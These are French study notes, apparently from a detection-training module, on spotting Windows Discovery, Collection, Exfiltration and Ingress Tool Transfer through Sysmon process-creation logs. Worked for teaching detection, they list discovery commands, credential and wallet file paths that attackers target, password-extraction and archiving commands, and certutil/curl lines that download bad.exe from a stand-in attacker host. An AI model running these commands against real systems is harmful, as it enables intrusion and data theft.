## Discovery Overview

### Situational Awareness

Mapped au tactic MITRE **Discovery**. Objectif : comprendre l'environnement, les privilèges, les outils de sécurité présents.

![[discovery.png]]

### Discovery Commands

|But|Commandes|
|---|---|
|Fichiers/Dossiers|`type <file>`, `Get-Content <file>`, `dir <folder>`, `Get-ChildItem <folder>`|
|Utilisateurs/Groupes|`whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser`|
|Système/Apps|`tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service`|
|Réseau|`ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles`|
|Antivirus actif|`Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"`|

### Discovery Process

Après exécution d'une pièce jointe phishing → discovery automatique → si AV détecté ou victime hors cible → auto-suppression. Sinon → callback vers l'attaquant → contrôle manuel via CMD (ex: Metasploit).

![[how_attackers_control_victim.png]]

---

## Detecting Discovery

### Discovery via CMD

Méthode la plus commune. Les commandes (`whoami`, `ipconfig`, etc.) sont loggées comme **nouvelles créations de processus**.

```
C:\Users\victim\Downloads\invoice.pdf.exe
├── cmd.exe
│   ├── ipconfig
│   ├── whoami /priv
│   ├── dir
│   ├── net user
│   ├── tasklist /v
│   └── wmic computersystem get model
└── powershell.exe
    ├── Get-Service
    └── Get-MpPreference
```

### Discovery via GUI

Après accès RDP → interface graphique disponible. Pas de `whoami` visible, mais processus caractéristiques :

```
explorer.exe
├── cmd.exe
├── mmc.exe compmgmt.msc       // Computer Management
├── control.exe netconnections // Adaptateurs réseau
├── SystemSettings.exe         // Panneau paramètres
├── notepad.exe secrets.txt    // Lecture fichier
└── taskmgr.exe
```

### Detecting Discovery

**Détection** : chercher une commande de discovery, ou mieux, une **séquence de commandes sur une courte période**.

**Sources de logs :**

- Sysmon **Event ID 1** (process creation)
- Fichier **historique PowerShell**

**Identifier l'origine** : reconstruire le process tree via Sysmon en corrélant `ProcessId` ↔ `ParentProcessId`. `ipconfig` seul n'est pas suspect (usage légitime IT) → le contexte parent est clé.

![[detecting_discovery.png]]

---

## Collection Overview

### Searching Secrets

Tactics MITRE concernés : **Collection**, **Credential Access** (traité comme sous-ensemble de Collection), **Exfiltration**.

![[searching_secret.png]]

### Collection Targets

Les secrets peuvent être dans des **fichiers**, le **registre**, ou la **mémoire de processus**.

shell

```shell
# Blackmail → Photos, Chats, Historique navigateur
C:\Users\<user>\AppData\Roaming\Signal\*
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History

# Vol d'argent → Sessions bancaires, Wallets crypto
C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies

# Vol corporate → SSH, BDD
C:\Users\<user>\.ssh\*
C:\Program Files\Microsoft SQL Server\...\DATA\*
```

### Exfiltrating Data

Collection automatique (scripts, < 1 min) ou manuelle (heures). Toujours suivie d'une exfiltration vers un serveur contrôlé.

Techniques d'évasion courantes :

- Upload vers cloud légitime : Dropbox, Mega, Amazon S3
- Upload vers GitHub, Telegram
- Domaine imitant du légitime : `windows-updates.com`

---

## Detecting Collection

### Detecting Collection

Même principe que Discovery : tracker les **créations de processus** (Sysmon EID 1).

|Commande|Description|
|---|---|
|`notepad.exe C:\Users\<user>\Desktop\finances.csv`|Lecture fichier sensible|
|`type debug-logs.txt \| findstr password > C:\Temp\passwords.txt`|Extraction mots de passe|
|`Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf`|Recherche récursive de fichiers|
|`copy C:\Users\<user>\AppData\Roaming\Signal C:\Temp\`|Copie historique Signal|
|`Compress-Archive C:\Temp\ C:\Temp\stolen_data.zip`|Archivage avant exfiltration|
|`7za.exe a -tzip C:\Temp\stolen_data.zip C:\Temp\*.*`|Idem via 7-Zip|

### Collection Examples

Détection via **Sysmon EID 1** : processus Notepad/Wordpad ouvrant des fichiers sensibles, suivi de 7-Zip pour archiver → pattern facilement identifiable dans les logs.

![[collection_exemples.png]]

### Data Stealers

Malware automatisant collection + exfiltration sur postes personnels. N'utilise **pas** CMD/PowerShell → code natif (ex: C#). Rend difficile l'identification des données précisément volées.

Exemple **Gremlin Stealer** : vole VPN, wallets crypto, sessions navigateur, Steam, Discord, Telegram, screenshots — sans aucune commande CMD.

![[data_stealer.png]]

---

## Ingress Tool Transfer

### Ingress Tool Transfer

Technique MITRE : téléchargement d'outils supplémentaires sur le système compromis. Utilisée dans la majorité des breaches.

Raisons du split en plusieurs fichiers : contourner l'AV + limiter l'exposition des outils si détection précoce.

Exemples d'outils téléchargés : Seatbelt (discovery), Mimikatz (credentials), Remcos RAT, ransomware.

### Common Transfer Methods

|Méthode|Commande|
|---|---|
|Certutil|`certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe`|
|Curl (Win10+)|`curl.exe https://blackhat.thm/bad.exe -o good.exe`|
|PowerShell IWR|`powershell -c "Invoke-WebRequest -Uri 'https://...' -OutFile 'good.exe'"`|
|GUI (RDP)|Copier-coller ou téléchargement navigateur, pas de CMD|

### Detecting Tool Transfer

Tracker : **connexion réseau** ou **requête DNS** émise par le processus suspect.

Points d'attention :

- Quel processus initie la connexion ?
- Domaine de destination (peut être GitHub ou autre service légitime)
- Fichier téléchargé

Chain type : `cmd.exe` → `curl.exe` → connexion domaine malveillant → fichier déposé.

![[detecting_tool_transfer.png]]

---

## Résumé — Windows Threat Detection 2

### Tactiques couvertes

|Tactic MITRE|Objectif attaquant|
|---|---|
|Discovery|Comprendre l'environnement, privilèges, sécurité|
|Collection / Credential Access|Voler les données de valeur|
|Exfiltration|Envoyer les données au C2|
|Ingress Tool Transfer|Télécharger des outils supplémentaires|

### Détection — Ce qu'il faut surveiller

**Sysmon EID 1** (process creation) est la source principale pour tout détecter.

- Discovery : séquence de commandes courtes sur une période brève → reconstruire le process tree via `ProcessId` / `ParentProcessId`
- Collection : accès à des fichiers sensibles, archivage (`Compress-Archive`, `7za`), copie vers `C:\Temp\`
- Data Stealers : pas de CMD/PowerShell → détection par comportement réseau + fichiers accédés en code natif
- Ingress Tool Transfer : connexion réseau/DNS depuis un processus suspect → `certutil`, `curl`, `IWR` ou navigateur via RDP

### Pattern d'attaque type

```
Phishing attachment
  └── Discovery (whoami, ipconfig, net user...)
        └── Ingress Tool Transfer (téléchargement outils)
              └── Collection (lecture fichiers, archivage)
                    └── Exfiltration (Dropbox, GitHub, Telegram, domaine custom)
```

### Règle générale

Le contexte parent prime sur la commande seule. `ipconfig` lancé par `invoice.pdf.exe` → suspect. Lancé par un outil IT → légitime.